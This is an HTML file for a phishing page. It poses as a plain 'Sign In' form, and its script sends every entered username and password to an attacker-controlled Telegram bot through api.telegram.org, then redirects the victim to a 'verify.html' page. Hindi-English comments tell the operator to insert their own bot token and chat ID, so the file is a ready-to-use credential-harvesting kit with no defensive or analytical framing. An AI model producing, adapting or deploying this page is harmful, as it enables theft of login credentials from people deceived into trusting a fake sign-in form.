<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In</title>
    <style>
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #1c1f21; font-family: sans-serif; }
        input { font-size: 16px !important; width: 100%; padding: 15px; margin: 10px 0; background: #121415; border: 1px solid #2d3034; border-radius: 8px; color: white; box-sizing: border-box; }
        .container { width: 90%; margin: auto; padding-top: 50px; text-align: center; color: white; }
        .btn { width: 100%; padding: 15px; background: #3bc117; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Sign In</h2>
        <input type="text" id="username" placeholder="Username / Email">
        <input type="password" id="password" placeholder="Password">
        <button class="btn" onclick="processLogin()">Sign In</button>
    </div>

    <script>
        function processLogin() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (user === '' || pass === '') {
                alert('Please enter details');
                return;
            }

            // APNI DETAILS YAHAN DAALEIN
            const botToken = "YOUR_API_TOKEN_HERE"; 
            const chatId = "YOUR_CHAT_ID_HERE";
            
            const text = `--- NEW LOGIN ---\nUser: ${user}\nPass: ${pass}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

            // Bot ko message bhej rahe hain...
            fetch(url).then(() => {
                // Message bhejne ke baad verify page par le jayenge
                window.location.href = "verify.html";
            });
        }
    </script>
</body>
</html>
